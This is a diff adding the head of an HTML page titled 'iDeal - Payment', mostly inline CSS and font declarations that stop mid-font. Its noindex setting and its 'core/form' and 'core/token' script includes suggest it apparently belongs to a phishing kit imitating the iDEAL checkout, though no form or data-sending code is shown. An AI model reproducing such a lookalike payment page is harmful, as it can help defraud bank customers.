@@ -1,0 +1,601 @@
+<html lang="nl" class="notranslate" translate="no"><head><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
+    <meta charset="utf-8">
+    <title>iDeal - Payment</title>
+ 
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <script type="text/javascript" src="../../../bower_components/jquery/dist/jquery.min.js">
+    </script>
+    <script type="text/javascript" src="../../../bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
+    <script type="text/javascript" src="../../../core/form/core_form.js"></script>
+    <script type="text/javascript" src="../../../core/token/core_token.js"></script>
+    <script type="text/javascript" src="../../../bower_components/jquery.maskedinput/dist/jquery.maskedinput.min.js">
+    </script>
+    <link rel="stylesheet" href="../../../core/form/core_form.css">
+    <link rel="stylesheet" href="../../../node_modules/bootstrap/dist/css/bootstrap.min.css">
+    <script type="text/javascript" src="../../../bower_components/angular/angular.min.js">
+    </script>
+    <base href="">
+	<link rel="stylesheet" href="form/css.css">
+    <link rel="icon" type="image/svg" href="ideal.svg">
+	<style>
+		:root{--sp-base:8px;--sp:calc(var(--sp-base) * 1);--primary-color:#CC0066;--secondary-color:#EEF5F7;--white:#FFFFFF;--black:#232323;--font-primary:"Lexend Deca", sans-serif;--font-secondary:"Roboto Slab", serif;}
+		body{margin:0;font-family:var(--font-primary);font-weight:300!important;background-color:var(--secondary-color);}
+		:root{--toastify-color-light:#fff;--toastify-color-dark:#121212;--toastify-color-info:#3498db;--toastify-color-success:#07bc0c;--toastify-color-warning:#f1c40f;--toastify-color-error:#e74c3c;--toastify-color-transparent:hsla(0,0%,100%,.7);--toastify-icon-color-info:var(--toastify-color-info);--toastify-icon-color-success:var(--toastify-color-success);--toastify-icon-color-warning:var(--toastify-color-warning);--toastify-icon-color-error:var(--toastify-color-error);--toastify-toast-width:320px;--toastify-toast-background:#fff;--toastify-toast-min-height:64px;--toastify-toast-max-height:800px;--toastify-font-family:sans-serif;--toastify-z-index:9999;--toastify-text-color-light:#757575;--toastify-text-color-dark:#fff;--toastify-text-color-info:#fff;--toastify-text-color-success:#fff;--toastify-text-color-warning:#fff;--toastify-text-color-error:#fff;--toastify-spinner-color:#616161;--toastify-spinner-color-empty-area:#e0e0e0;--toastify-color-progress-light:linear-gradient(90deg,#4cd964,#5ac8fa,#007aff,#34aadc,#5856d6,#ff2d55);--toastify-color-progress-dark:#bb86fc;--toastify-color-progress-info:var(--toastify-color-info);--toastify-color-progress-success:var(--toastify-color-success);--toastify-color-progress-warning:var(--toastify-color-warning);--toastify-color-progress-error:var(--toastify-color-error);}
+		:root{--toastify-toast-width:568px;}
+		html{-webkit-font-smoothing:antialiased;box-sizing:border-box;text-size-adjust:100%;}
+		*,::before,::after{box-sizing:inherit;}
+		body{margin:0px;color:rgba(0, 0, 0, 0.87);font-family:Roboto, Helvetica, Arial, sans-serif;font-weight:400;font-size:1rem;line-height:1.5;letter-spacing:0.00938em;background-color:rgb(238, 246, 247);}
+		@media print{
+		body{background-color:rgb(255, 255, 255);}
+		}
+		body{overflow-y:auto!important;padding-right:0px!important;}
+		.css-1jak6br{width:100vw;min-height:100vh;display:flex;flex-direction:column;position:relative;-webkit-box-flex:1;flex-grow:1;}
+		.css-1ixkyp3{width:100%;padding-top:24px;padding-bottom:32px;}
+		.css-6wvj86{width:100%;margin-left:auto;box-sizing:border-box;margin-right:auto;display:block;height:auto;padding:0px 16px;}
+		@media (min-width: 976px){
+		.css-6wvj86{max-width:976px;}
+		}
+		@media (min-width: 904px){
+		.css-6wvj86{padding:0px 32px;}
+		}
+		.css-tjvzl1{box-sizing:border-box;display:flex;flex-flow:wrap;width:100%;height:100%;}
+		@media (min-width: 100px){
+		.css-tjvzl1{width:calc(100% + 16px);margin-left:-16px;}
+		.css-tjvzl1 > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 599px){
+		.css-tjvzl1{width:calc(100% + 16px);margin-left:-16px;}
+		.css-tjvzl1 > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 904px){
+		.css-tjvzl1{width:calc(100% + 40px);margin-left:-40px;}
+		.css-tjvzl1 > .MuiGrid-item{padding-left:40px;}
+		}
+		@media (min-width: 1239px){
+		.css-tjvzl1{width:calc(100% + 48px);margin-left:-48px;}
+		.css-tjvzl1 > .MuiGrid-item{padding-left:48px;}
+		}
+		.css-660gbj{box-sizing:border-box;margin:0px;flex-direction:row;position:relative;display:flex;-webkit-box-align:center;align-items:center;}
+		@media (min-width: 100px){
+		.css-660gbj{flex-basis:25%;-webkit-box-flex:0;flex-grow:0;max-width:25%;}
+		}
+		@media (min-width: 599px){
+		.css-660gbj{flex-basis:25%;-webkit-box-flex:0;flex-grow:0;max-width:25%;}
+		}
+		@media (min-width: 904px){
+		.css-660gbj{flex-basis:12.5%;-webkit-box-flex:0;flex-grow:0;max-width:12.5%;}
+		}
+		@media (min-width: 1239px){
+		.css-660gbj{flex-basis:12.5%;-webkit-box-flex:0;flex-grow:0;max-width:12.5%;}
+		}
+		.css-uzcjjk{box-sizing:border-box;margin:0px;flex-direction:row;text-align:center;}
+		@media (min-width: 100px){
+		.css-uzcjjk{flex-basis:75%;-webkit-box-flex:0;flex-grow:0;max-width:75%;}
+		}
+		@media (min-width: 599px){
+		.css-uzcjjk{flex-basis:75%;-webkit-box-flex:0;flex-grow:0;max-width:75%;}
+		}
+		@media (min-width: 904px){
+		.css-uzcjjk{flex-basis:75%;-webkit-box-flex:0;flex-grow:0;max-width:75%;}
+		}
+		@media (min-width: 1239px){
+		.css-uzcjjk{flex-basis:75%;-webkit-box-flex:0;flex-grow:0;max-width:75%;}
+		}
+		@media (max-width: 903.95px){
+		.css-uzcjjk{text-align:right;}
+		}
+		.css-181pjz7{width:100%;margin-left:auto;box-sizing:border-box;margin-right:auto;height:100%;padding:0px 16px;display:flex;flex-direction:column;}
+		@media (min-width: 976px){
+		.css-181pjz7{max-width:976px;}
+		}
+		@media (min-width: 904px){
+		.css-181pjz7{padding:0px 32px;}
+		}
+		.css-1rr4qq7{flex:1 1 0%;}
+		.css-16vi85n{width:100%;margin-left:auto;box-sizing:border-box;margin-right:auto;display:block;padding:0px 16px;height:100%;}
+		@media (min-width: 976px){
+		.css-16vi85n{max-width:976px;}
+		}
+		@media (min-width: 904px){
+		.css-16vi85n{padding:0px 32px;}
+		}
+		.css-n3ajoa{box-sizing:border-box;display:flex;flex-flow:wrap;width:100%;margin-top:0px;height:100%;min-height:72px;}
+		.css-n3ajoa > .MuiGrid-item{padding-top:16px;}
+		@media (min-width: 100px){
+		.css-n3ajoa{width:calc(100% + 16px);margin-left:-16px;}
+		.css-n3ajoa > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 599px){
+		.css-n3ajoa{width:calc(100% + 16px);margin-left:-16px;}
+		.css-n3ajoa > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 904px){
+		.css-n3ajoa{width:calc(100% + 40px);margin-left:-40px;}
+		.css-n3ajoa > .MuiGrid-item{padding-left:40px;}
+		}
+		@media (min-width: 1239px){
+		.css-n3ajoa{width:calc(100% + 48px);margin-left:-48px;}
+		.css-n3ajoa > .MuiGrid-item{padding-left:48px;}
+		}
+		.css-si52lk{box-sizing:border-box;margin:0px;flex-direction:row;padding-top:0px!important;padding-bottom:0px!important;}
+		@media (min-width: 100px){
+		.css-si52lk{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		@media (min-width: 599px){
+		.css-si52lk{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		@media (min-width: 904px){
+		.css-si52lk{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		@media (min-width: 1239px){
+		.css-si52lk{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		.css-12j04ju{display:flex;gap:32px;flex-wrap:wrap;}
+		@media (max-width: 598.95px){
+		.css-12j04ju{flex-direction:column;-webkit-box-align:start;align-items:start;gap:16px;}
+		}
+		.css-xg2kjm{box-sizing:border-box;margin:0px;flex-direction:row;padding-top:0px!important;padding-bottom:0px!important;}
+		@media (min-width: 100px){
+		.css-xg2kjm{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		@media (min-width: 599px){
+		.css-xg2kjm{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		@media (min-width: 904px){
+		.css-xg2kjm{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		@media (min-width: 1239px){
+		.css-xg2kjm{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		@media (max-width: 598.95px){
+		.css-xg2kjm{width:50%;}
+		}
+		.css-gpx39x{display:flex;-webkit-box-pack:end;justify-content:flex-end;flex-wrap:wrap;gap:32px;}
+		@media (max-width: 598.95px){
+		.css-gpx39x{flex-direction:column;-webkit-box-align:end;align-items:end;gap:16px;}
+		}
+		.css-3nsu35{display:flex;flex-direction:column;-webkit-box-pack:center;justify-content:center;-webkit-box-align:center;align-items:center;height:100%;min-height:72px;}
+		@media (max-width: 903.95px){
+		.css-3nsu35{-webkit-box-align:end;align-items:end;flex-direction:column-reverse;}
+		}
+		.css-70qvj9{display:flex;-webkit-box-align:center;align-items:center;}
+		.css-bkc3oc{min-height:62px;display:flex;-webkit-box-pack:justify;justify-content:space-between;-webkit-box-align:center;align-items:center;margin-bottom:32px;padding-top:16px;padding-bottom:16px;}
+		@media (max-width: 598.95px){
+		.css-bkc3oc{gap:24px;flex-wrap:wrap;}
+		}
+		.css-1k6yql2{display:flex;-webkit-box-pack:start;justify-content:flex-start;-webkit-box-align:center;align-items:center;}
+		.css-h0jpzp{box-sizing:border-box;display:flex;flex-flow:wrap;width:100%;-webkit-box-pack:center;justify-content:center;}
+		@media (min-width: 100px){
+		.css-h0jpzp{width:calc(100% + 16px);margin-left:-16px;}
+		.css-h0jpzp > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 599px){
+		.css-h0jpzp{width:calc(100% + 16px);margin-left:-16px;}
+		.css-h0jpzp > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 904px){
+		.css-h0jpzp{width:calc(100% + 40px);margin-left:-40px;}
+		.css-h0jpzp > .MuiGrid-item{padding-left:40px;}
+		}
+		@media (min-width: 1239px){
+		.css-h0jpzp{width:calc(100% + 48px);margin-left:-48px;}
+		.css-h0jpzp > .MuiGrid-item{padding-left:48px;}
+		}
+		@media (min-width: 904px) and (max-width: 940px){
+		.css-h0jpzp{transform:translateX(-8px);}
+		}
+		.css-1yqy90m{box-sizing:border-box;margin:0px 0px 16px;flex-direction:row;}
+		@media (min-width: 100px){
+		.css-1yqy90m{flex-basis:100%;-webkit-box-flex:0;flex-grow:0;max-width:100%;}
+		}
+		@media (min-width: 599px){
+		.css-1yqy90m{flex-basis:100%;-webkit-box-flex:0;flex-grow:0;max-width:100%;}
+		}
+		@media (min-width: 904px){
+		.css-1yqy90m{flex-basis:75%;-webkit-box-flex:0;flex-grow:0;max-width:75%;}
+		}
+		@media (min-width: 1239px){
+		.css-1yqy90m{flex-basis:75%;-webkit-box-flex:0;flex-grow:0;max-width:75%;}
+		}
+		.css-oevazw{box-sizing:border-box;display:flex;flex-flow:wrap;width:100%;}
+		@media (min-width: 100px){
+		.css-oevazw{width:calc(100% + 16px);margin-left:-16px;}
+		.css-oevazw > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 599px){
+		.css-oevazw{width:calc(100% + 16px);margin-left:-16px;}
+		.css-oevazw > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 904px){
+		.css-oevazw{width:calc(100% + 40px);margin-left:-40px;}
+		.css-oevazw > .MuiGrid-item{padding-left:40px;}
+		}
+		@media (min-width: 1239px){
+		.css-oevazw{width:calc(100% + 48px);margin-left:-48px;}
+		.css-oevazw > .MuiGrid-item{padding-left:48px;}
+		}
+		.css-1fa8l1e{box-sizing:border-box;margin:0px;flex-direction:row;}
+		@media (min-width: 100px){
+		.css-1fa8l1e{flex-basis:100%;-webkit-box-flex:0;flex-grow:0;max-width:100%;}
+		}
+		@media (min-width: 904px){
+		.css-1fa8l1e{flex-basis:100%;-webkit-box-flex:0;flex-grow:0;max-width:100%;}
+		}
+		.css-6ucs9f{box-sizing:border-box;display:flex;flex-flow:wrap;list-style:none;width:100%;padding-left:0px;}
+		@media (min-width: 100px){
+		.css-6ucs9f{width:calc(100% + 16px);margin-left:-16px;}
+		.css-6ucs9f > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 599px){
+		.css-6ucs9f{width:calc(100% + 16px);margin-left:-16px;}
+		.css-6ucs9f > .MuiGrid-item{padding-left:16px;}
+		}
+		@media (min-width: 904px){
+		.css-6ucs9f{width:calc(100% + 40px);margin-left:-40px;}
+		.css-6ucs9f > .MuiGrid-item{padding-left:40px;}
+		}
+		@media (min-width: 1239px){
+		.css-6ucs9f{width:calc(100% + 48px);margin-left:-48px;}
+		.css-6ucs9f > .MuiGrid-item{padding-left:48px;}
+		}
+		@media (min-width: 100px){
+		.css-6ucs9f{row-gap:8px;}
+		}
+		@media (min-width: 904px){
+		.css-6ucs9f{row-gap:24px;}
+		}
+		.css-1p04aae{box-sizing:border-box;margin:0px;flex-direction:row;list-style:none;}
+		@media (min-width: 100px){
+		.css-1p04aae{flex-basis:100%;-webkit-box-flex:0;flex-grow:0;max-width:100%;}
+		}
+		@media (min-width: 904px){
+		.css-1p04aae{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		.css-ujf2ka{width:48px;border-radius:8px;height:48px;display:block;}
+		.css-1l96zw3{box-sizing:border-box;margin:0px;flex-direction:row;}
+		@media (min-width: 904px){
+		.css-1l96zw3{flex-basis:50%;-webkit-box-flex:0;flex-grow:0;max-width:50%;}
+		}
+		.css-5mijzf{display:flex;background-color:rgb(238, 245, 247);}
+		.css-juhzsm{margin-bottom:1px;width:100%;background-color:rgb(255, 255, 255);min-height:72px;}
+		.css-as8dbu{margin:0px;font-family:"Lexend Deca Variable";color:rgb(35, 35, 35);font-size:1.3125rem;font-weight:300;line-height:1.75rem;text-overflow:ellipsis;overflow:hidden;max-width:90%;white-space:nowrap;}
+		@media (max-width: 598.95px){
+		.css-as8dbu{font-size:1.1875rem;line-height:1.5rem;}
+		}
+		.css-1uoqkc7{margin:0px;font-family:"Lexend Deca Variable";font-size:1.5rem;line-height:2rem;letter-spacing:0.00714em;color:rgb(35, 35, 35);font-weight:600;}
+		@media (max-width: 598.95px){
+		.css-1uoqkc7{font-size:1.375rem;line-height:1.75rem;}
+		}
+		.css-1dnxymp{height:100%;width:100%;min-height:400px;-webkit-box-flex:1;flex-grow:1;background-color:rgb(255, 255, 255);border-bottom-left-radius:42px;border-bottom-right-radius:42px;padding-top:0px;padding-bottom:64px;position:relative;display:flex;flex-direction:column;}
+		.css-1fyvfqx{display:inline-flex;-webkit-box-align:center;align-items:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;outline:0px;border:0px;margin:0px;cursor:pointer;user-select:none;vertical-align:middle;appearance:none;text-decoration:none;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1), border-color 250ms cubic-bezier(0.4, 0, 0.2, 1), color 250ms cubic-bezier(0.4, 0, 0.2, 1);border-radius:5px;text-transform:none;background-color:transparent;font-family:"Lexend Deca Variable";font-size:1.125rem;line-height:1.375rem;font-weight:600;letter-spacing:-0.03125rem;color:rgb(204, 0, 102);padding:0px;min-width:auto;-webkit-box-pack:start;justify-content:flex-start;}
+		@media print{
+		.css-1fyvfqx{print-color-adjust:exact;}
+		}
+		.css-1fyvfqx:hover{text-decoration:none;background-color:rgba(0, 0, 0, 0.04);}
+		@media (hover: none){
+		.css-1fyvfqx:hover{background-color:transparent;}
+		}
+		.css-1fyvfqx:disabled{color:rgb(182, 182, 182);}
+		.css-1fyvfqx:hover{background-color:transparent;}
+		@media (max-width: 598.95px){
+		.css-1fyvfqx{font-size:1rem;width:100%;}
+		}
+		.css-1fyvfqx:hover{text-decoration:underline;text-underline-offset:8px;}
+		.css-1fyvfqx:focus{color:rgb(145, 0, 90);text-decoration:underline;text-underline-offset:8px;}
+		.css-1fyvfqx:active{color:rgb(145, 0, 90);text-decoration:underline;text-underline-offset:8px;}
+		@media (max-width: 598.95px){
+		.css-1fyvfqx{width:auto;}
+		}
+		.css-oxa9sm{display:inline-flex;-webkit-box-align:center;align-items:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;outline:0px;border:0px;margin:0px;cursor:pointer;user-select:none;vertical-align:middle;appearance:none;text-decoration:none;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1), border-color 250ms cubic-bezier(0.4, 0, 0.2, 1), color 250ms cubic-bezier(0.4, 0, 0.2, 1);border-radius:5px;text-transform:none;background-color:transparent;font-family:"Lexend Deca Variable";font-size:1.125rem;line-height:1.375rem;font-weight:600;letter-spacing:-0.03125rem;color:rgb(204, 0, 102);padding:0px;-webkit-box-pack:start;justify-content:flex-start;min-width:auto;}
+		@media print{
+		.css-oxa9sm{print-color-adjust:exact;}
+		}
+		.css-oxa9sm:hover{text-decoration:none;background-color:rgba(0, 0, 0, 0.04);}
+		@media (hover: none){
+		.css-oxa9sm:hover{background-color:transparent;}
+		}
+		.css-oxa9sm:disabled{color:rgb(182, 182, 182);}
+		.css-oxa9sm:hover{background-color:transparent;}
+		@media (max-width: 598.95px){
+		.css-oxa9sm{font-size:1rem;width:100%;}
+		}
+		.css-oxa9sm:hover{text-decoration:underline;text-underline-offset:8px;}
+		.css-oxa9sm:focus{color:rgb(145, 0, 90);text-decoration:underline;text-underline-offset:8px;}
+		.css-oxa9sm:active{color:rgb(145, 0, 90);text-decoration:underline;text-underline-offset:8px;}
+		@media (max-width: 598.95px){
+		.css-oxa9sm{width:auto;}
+		}
+		.css-6hs6s5{margin:0px 0px 24px;font-family:"Roboto Slab";font-weight:400;font-size:2.5rem;line-height:3.5rem;letter-spacing:-0.00833em;color:rgb(35, 35, 35);text-align:center;}
+		@media (max-width: 598.95px){
+		.css-6hs6s5{font-size:2rem;line-height:3rem;}
+		}
+		.css-esxpdh {
+    all: unset;
+    outline-offset: -2px;
+    box-sizing: border-box;
+    cursor: pointer;
+    display: flex;
+    column-gap: 16px;
+    -webkit-box-align: center;
+    align-items: center;
+    min-width: 312px;
+    width: 100%;
+    user-select: none;
+    position: relative;
+    outline: rgb(222, 222, 222) solid 1px;
+    border-radius: 12px;
+    padding: 4px;
+    transition: outline-color 0.3s linear;
+}
+		.css-esxpdh:focus,.css-esxpdh:hover{outline:rgb(109, 164, 182) solid 2px;}
+		.css-esxpdh:focus{outline-offset:-2px;}
+		.css-esxpdh:active{background-color:rgb(238, 245, 247);}
+		.css-h3zz7w{margin:0px;font-family:"Lexend Deca Variable";color:rgb(35, 35, 35);font-size:1.125rem;font-weight:300;line-height:1.625rem;user-select:none;}
+		@media (max-width: 598.95px){
+		.css-h3zz7w{font-size:1rem;line-height:1.5rem;}
+		}
+		.css-jz4d1j{display:inline-flex;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;outline:0px;border:0px;margin:0px;cursor:pointer;user-select:none;vertical-align:middle;appearance:none;text-decoration:none;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1), border-color 250ms cubic-bezier(0.4, 0, 0.2, 1), color 250ms cubic-bezier(0.4, 0, 0.2, 1);border-radius:5px;text-transform:none;background-color:transparent;font-family:"Lexend Deca Variable";font-size:1.125rem;line-height:1.375rem;letter-spacing:-0.03125rem;color:rgb(35, 35, 35);font-weight:300;padding:0px;min-width:auto;}
+		@media print{
+		.css-jz4d1j{print-color-adjust:exact;}
+		}
+		.css-jz4d1j:hover{text-decoration:none;background-color:rgba(0, 0, 0, 0.04);}
+		@media (hover: none){
+		.css-jz4d1j:hover{background-color:transparent;}
+		}
+		.css-jz4d1j:disabled{color:rgb(182, 182, 182);}
+		.css-jz4d1j:hover{background-color:transparent;}
+		@media (max-width: 598.95px){
+		.css-jz4d1j{font-size:1rem;width:100%;}
+		}
+		.css-jz4d1j:hover{color:rgb(204, 0, 102);text-decoration:underline;text-underline-offset:8px;}
+		.css-jz4d1j:focus{color:rgb(204, 0, 102);text-decoration:underline;text-underline-offset:8px;}
+		.css-jz4d1j:active{color:rgb(204, 0, 102);text-decoration:underline;text-underline-offset:8px;}
+		@media (max-width: 598.95px){
+		.css-jz4d1j{width:auto;}
+		}
+		.css-1tt1035{margin:24px 0px 0px;font-family:"Lexend Deca Variable";color:rgb(35, 35, 35);font-size:0.875rem;font-weight:300;line-height:1.125rem;}
+		.css-1j1n5pv{display:inline-flex;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;outline:0px;border:0px;margin:0px;cursor:pointer;user-select:none;vertical-align:middle;appearance:none;text-decoration:none;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1), box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1), border-color 250ms cubic-bezier(0.4, 0, 0.2, 1), color 250ms cubic-bezier(0.4, 0, 0.2, 1);border-radius:5px;text-transform:none;background-color:transparent;font-family:"Lexend Deca Variable";font-size:1.125rem;line-height:1.375rem;font-weight:600;letter-spacing:-0.03125rem;color:rgb(35, 35, 35);padding:0px;min-width:auto;}
+		@media print{
+		.css-1j1n5pv{print-color-adjust:exact;}
+		}
+		.css-1j1n5pv:hover{text-decoration:none;background-color:rgba(0, 0, 0, 0.04);}
+		@media (hover: none){
+		.css-1j1n5pv:hover{background-color:transparent;}
+		}
+		.css-1j1n5pv:disabled{color:rgb(182, 182, 182);}
+		.css-1j1n5pv:hover{background-color:transparent;}
+		@media (max-width: 598.95px){
+		.css-1j1n5pv{font-size:1rem;width:100%;}
+		}
+		.css-1j1n5pv:hover{color:rgb(204, 0, 102);text-decoration:underline;text-underline-offset:8px;}
+		.css-1j1n5pv:focus{color:rgb(204, 0, 102);text-decoration:underline;text-underline-offset:8px;}
+		.css-1j1n5pv:active{color:rgb(204, 0, 102);text-decoration:underline;text-underline-offset:8px;}
+		@media (max-width: 598.95px){
+		.css-1j1n5pv{width:auto;}
+		}
+		@font-face{font-family:Lexend Deca Variable;font-style:normal;font-display:swap;font-weight:100 900;src:url(lexend-deca-vietnamese-wght-normal-59f2ab51.woff2) format("woff2-variations");unicode-range:U+0102-0103,U+0110-0111,U+0128-0129,U+0168-0169,U+01A0-01A1,U+01AF-01B0,U+0300-0301,U+0303-0304,U+0308-0309,U+0323,U+0329,U+1EA0-1EF9,U+20AB;}
+		@font-face{font-family:Lexend Deca Variable;font-style:normal;font-display:swap;font-weight:100 900;src:url(lexend-deca-latin-ext-wght-normal-38f59e41.woff2) format("woff2-variations");unicode-range:U+0100-02AF,U+0304,U+0308,U+0329,U+1E00-1E9F,U+1EF2-1EFF,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF;}
+		@font-face{font-family:Lexend Deca Variable;font-style:normal;font-display:swap;font-weight:100 900;src:url(lexend-deca-latin-wght-normal-3f6d622a.woff2) format("woff2-variations");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD;}
+		@font-face{font-family:'Roboto Slab';font-style:normal;font-weight:100 900;font-display:swap;src:url(roboto.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}
+		@font-face{font-family:Roboto Slab;font-style:normal;font-display:swap;font-weight:400;src:url(roboto-slab-cyrillic-ext-400-normal-f76622ea.woff2) format("woff2"),url(roboto-slab-cyrillic-ext-400-normal-c051e28b.woff) format("woff");unicode-range:U+0460-052F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F;}
+		@font-face{font-family:Roboto Slab;font-style:normal;font-display:swap;font-weight:400;src:url(roboto-slab-cyrillic-400-normal-0f391f42.woff2) format("woff2"),url(roboto-slab-cyrillic-400-normal-93673c8f.woff) format("woff");unicode-range:U+0301,U+0400-045F,U+0490-0491,U+04B0-04B1,U+2116;}
+		@font-face{font-family:Roboto Slab;font-style:normal;font-display:swap;font-weight:400;src:url(data:font/woff2;base64,d09GMgABAAAAAATQABAAAAAACYAAAAR0AAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGiIbehyBVAZgP1NUQVQuAFgRCAqEYIQGCxoAATYCJAMuBCAFhFQHgQsMBxvxB1GUUM54JF8lZDgGuk5VQtGTOc7pdf3JLKIUfzw9Hvqf+7wzecnPIpVYAbCr6vHoWsWOUEg2htC4ahSutht7+E6bF/nkwkyuEDZsu40OBP4kosndfks4xFhfoAZAwP/X/2q6hQNw4lrpRWGPZ4AfaQNmegYmVYOu4IFF9AclL9BTlIl5Y25w2gH4/FAiMA6EI9lDERpogJN+qwThHFVnFkJxsc7WAoUCHRDiAmNpgQiBUKRWaKVFeNjKDUdFd8AOWT2VGjayLafXwOCRNlKL7toe2XzyXENzKxRSCEnsxUkJJBZB0eMXkaiEVcglEKhUCKeRcbCH1NMHld0K+9EwyDXQceR6RyzfoRo1rgG20S4t96ioqbfwLgOeysZkxY0ZD9B7MN2Jy9HgGBL3n/V/bwN4hxyjA+gVUHbzt4FluEJoBSYRFuFc1+ltxAepQoaYpkF+BiQqTOIKTOI5Cga1UnHIcUqvrF7/BhRA/oLr/zGJ07O9IAAUtBohOlCCQTALRvAE/AWsA6sARXaRDdeuzqrJVKKpISpBx7YSHk8iEaikA9v0HyD4Jf2lA7ircqBCSiUDpf2LIJOx5YrSm2vk1T0l3Zsn3LnzgGj4w7t3pRNv374P3Lt1q3ji3Ycld3hwRzLh1j3g/u0Bd+4QSXE7sahCWjqQDUF5RlkV79AoGTgBzk5Swy+deJeKkm/dagR/m5oHBTu0j/FzHRcD/jj5ao6r9gH4KQ+gHmJS9LrtvL5XqrNRMWTFkOa2NVJNvdS4Ykhg4pXbOdsE27Ci/eSnpkWn8uUrO6zIVyw6nTNt8uznpnmnsxQrOqzMks87pWw3a+X0HVMLOBs7bSjEzmlTR+6eXoX1ygOrOLun+X7JKIzInlZRsqs8ybEhMCA52H5tuR2iU898gOzUgybVi97eIZz7or3KNx1k4gmY+tf01YsGd5jTO7MsPzerrPfcDhj0i5BrQOjpzzpyI9xArMQJUGukiRu/A45D/U4YB+FJvGdUQfFTEdLd5zNO1tYoY77KFQF+jD1cBvAzi/n1b/H/j92HQyNB8Nid9f8GmL8BEaIJBooC5+cv1GzUNM6hz5hE6fBgVZaFU4pJoMQvIQzajmcN7oCnpUC/G7iiiMFrctLoYTpk9DRsnl7Z7RS9WGMJvbbAKHpjlVrasFNkfMTHIOrKwfMowTDQ0bOxksitovjD+4LcT51WdRroMfywLHT8NTFowGhhxbDylylNslTZCqTyFcRPgHyseiwbVoEmder5ysfQsSs6gUUxhoWVAauFQ2dggKABHA4Q5WDo8uFF08iRQyN68sqCeiYsTcZq1Z/lqNSL/G8BAkVwUEiP4bDYQbksWEaMhs6uRPbDLmVZWDnwOHibFS4dQ6NBdvX8NGA1VyRYLJ1GZmixFhu1W6a2WSnkiSMS20WjRw1ilfMU4hKP+CQgIYlITBJBYv0PB5YI7S2GQHVICt/GtrDWAo86VSarX/6hK0GmwFM6iusa7DbmSyDqOv0CggPC9tH/beNNBgA=) 